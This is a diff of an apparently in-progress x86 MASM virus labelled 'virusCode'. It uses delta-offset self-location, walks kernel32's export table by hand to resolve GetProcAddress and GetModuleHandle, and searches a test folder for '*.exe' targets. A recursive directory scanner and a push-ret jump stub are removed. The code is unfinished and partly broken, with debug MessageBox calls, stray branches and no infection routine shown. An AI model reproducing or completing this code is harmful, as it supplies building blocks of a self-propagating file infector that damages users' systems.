@@ -4,12 +4,12 @@ option casemap:none
 
    include windows.inc
    include user32.inc
-   include kernel32.inc
+  ; include kernel32.inc
    include masm32.inc
    include masm32rt.inc
    
    includelib user32.lib
-   includelib kernel32.lib
+  ; includelib kernel32.lib
    includelib masm32.lib
    
 .data
@@ -39,12 +39,13 @@ virusCode:
 delta: 
 	pop ebp
 	mov eax,ebp
-	sub ebp,offset delta
+	sub ebp,delta
 	mov [ebp+delta_var],ebp
-	call start 
-start:
+	invoke MessageBox,NULL, addr FindFirstFileSuccess, addr FolderFound,MB_OK
+	call save_imagebase
+save_imagebase:
 	pop eax
-	and eax,0xFFF00000				; ...00000
+	;and eax,0xFFF00000		            ; ...00000
 	mov [ebp+image_base],eax			; save image base
 	
 scan_import:
@@ -113,18 +114,36 @@ find_API:
 	mov dword ptr [ebx+GetModuleHandleAddress],ebp
 	pop ebp
 	
-	push dword[ebp+kernel_string]					; get kernel32 image_base
-	call [ebp+GetModuleHandleAddress]				; call module handle for image
-	mov dword[ebp+handle],eax					; save handle from eax
+	push dword ptr[ebp+kernel_string]					; get kernel32 image_base
+	call [ebp+GetModuleHandleAddress]				      ; call module handle for image
+	mov dword ptr [ebp+handle],eax					; save handle from eax
 	
-	call GetAPIAddress						; now get api address 
+	call GetAPIAddress						      ; now get api address 
 	
-	push dword [ebp+virtual_out] 
-	push dword 0x80
-	push dword 0x1000
-	push dword [ebp+image_base]
-	call [ebp+Virtual]
+	;push dword ptr[ebp+virtual_out] 					; make 1st 1000 byte 
+	;push dword 0x80							      ; writeable
+	;push dword 0x1000
+	;push dword ptr[ebp+image_base]
+	;call [ebp+VirtualProtectAddress]
+find_first_file:
+	push dword ptr [ebp+Win32Data]
+	push dword ptr [ebp+search_mask]
+	call [ebp+FindFirstFileAAddress]
+	mov dword ptr[ebp+search_handle],eax
+find_next_file:
+	cmp eax,0
+	invoke MessageBox, NULL, addr FindFirstFileSuccess , addr FolderFound, MB_OK 
+	je done_find
+done_find:
+	ret
 	
+GetAPIAddress:
+	push dword ptr[ebp+FindFirstFileAStr]
+	push dword ptr[ebp+handle]                  ; module handle
+	call [ebp+GetProcAddressAddress]
+	mov [ebp+FindFirstFileAAddress],eax	
+	
+	ret
 is_it_kernel32: 				; check is it kernel32.dll
 	xor ecx,ecx				; reset ecx
 	mov ebx,dword ptr [eax]		; set ebx=[eax]
@@ -141,7 +160,7 @@ az1:
 	jne az2				; if not jmp to az2
 	inc ecx				; else ecx+=1
 az1_case_2:
-	cmp dword ptr[bx+4],"EL32"
+	cmp dword ptr[ebx+4],"EL32"
 	jne az2
 	inc ecx
 az2:	
@@ -178,7 +197,7 @@ find_ProcAddress:
 	mov eax,[ebx]
 	add eax,edi
 search_procaddress:
-	cmp dword[eax],"GetP"
+	cmp dword ptr[eax],"GetP"
 	je search_procadress_1
 back_search_procadress:
 	add ebx,4
@@ -188,16 +207,16 @@ back_search_procadress:
 	add ebp,4
 	jmp search_procaddress
 search_procadress_1:	
-	cmp dword[eax+4],"rocA"
+	cmp dword ptr[eax+4],"rocA"
 	jne back_search_procadress
 	inc ecx
-search_procadress_2
-	cmp dword[eax+8],"ddre"
+search_procadress_2:
+	cmp dword ptr[eax+8],"ddre"
 	jne back_search_procadress
 	inc ecx
 search_procadress_3:
-	cmp dword[eax+12],"ss"
-	back_search_procadress
+	cmp dword ptr[eax+12],"ss"
+	jne back_search_procadress
 	inc ecx
 search_procadress_4:
 	mov ebp,[ebp]
@@ -226,8 +245,8 @@ find_GetModuleHandle:
 	mov ebx,eax
 	mov eax,[ebx]
 	add eax,edi
-search_module	
-	cmp dword[eax],"GetM"
+search_module:	
+	cmp dword ptr[eax],"GetM"
 	je search_module_1
 back_search_module:
 	add ebx,4
@@ -237,15 +256,15 @@ back_search_module:
 	add ebp,4
 	jmp search_module
 search_module_1:
-	cmp dword[eax+4],"odul"
+	cmp dword ptr[eax+4],"odul"
 	jne back_search_module
 	inc ecx
 search_module_2:
-	cmp dword[eax+8],"eHan"
+	cmp dword ptr[eax+8],"eHan"
 	jne back_search_module
 	inc ecx
 search_module_3:
-	cmp dword[eax+12],"dleA"
+	cmp dword ptr[eax+12],"dleA"
 	jne back_search_module
 	inc ecx
 search_module_4:
@@ -254,68 +273,12 @@ search_module_4:
 	ret
 erreur:	
 	
-	
-	popfd
-	popad
-	
-jump: 
-	db 68h,0,0,0,0	
-	ret
-		
-ScanFiles proc
-	; Declare local varibles
-	LOCAL fileFD  : WIN32_FIND_DATA     
-	LOCAL fileHD  : HANDLE
-	LOCAL subPath : BYTE
-	
-	; Find first file 
-	; @param path (all : *.*)
-	; @param ptr to WIN32_FIND_DATA(fileFD)
-	; return : 
-	;  + Success :
-	;  + Fail : 
-	invoke FindFirstFile,addr fileFilter, addr fileFD
-		; check return value of eax
-		.if eax!=INVALID_HANDLE_VALUE
-			mov fileHD,eax
-			.while eax>0
-				lea esi,fileFD.cFileName
-				.if fileFD.cFileName != byte ptr "." && fileFD.cFileName != byte ptr ".."
-					;cmp [esi],byte ptr "."
-					;je nextfile
-					;cmp [esi],byte ptr ".."
-					;je nextfile
-					.if (fileFD.dwFileAttributes==16) ; check if result is dir
-						invoke MessageBox,NULL,addr fileFD.cFileName,addr FolderFound,MB_OK
-						invoke SetCurrentDirectory,addr fileFD.cFileName
-						call ScanFiles
-						invoke SetCurrentDirectory, addr backDir 
-					.else
-						invoke MessageBox,NULL,addr fileFD.cFileName,addr FindNextFileSuccess,MB_OK
-					.endif
-				.endif
-				
-			nextfile:
-				invoke FindNextFile, fileHD, addr fileFD
-			.endw	
-		invoke FindClose,fileHD
-		.endif
-	ret
-ScanFiles endp
-
-CheckFile proc fileName:dword
-	lea esi,fileName
-	;cmp [esi],[]
-	ret
-
-CheckFile endp
-
 
 end_objecttable:
 
 image_base    				dd    0h 
 kernel_string   		      	db    "kernel32.dll", 0 
-search_mask    				db    "*.exe", 0 
+search_mask    				db    "C:\Documents and Settings\F.U.C.K\Desktop\test\*.exe", 0 
 handle       				dd    0h
 GetProc     				dd    0h
 file_handle    				dd    0h
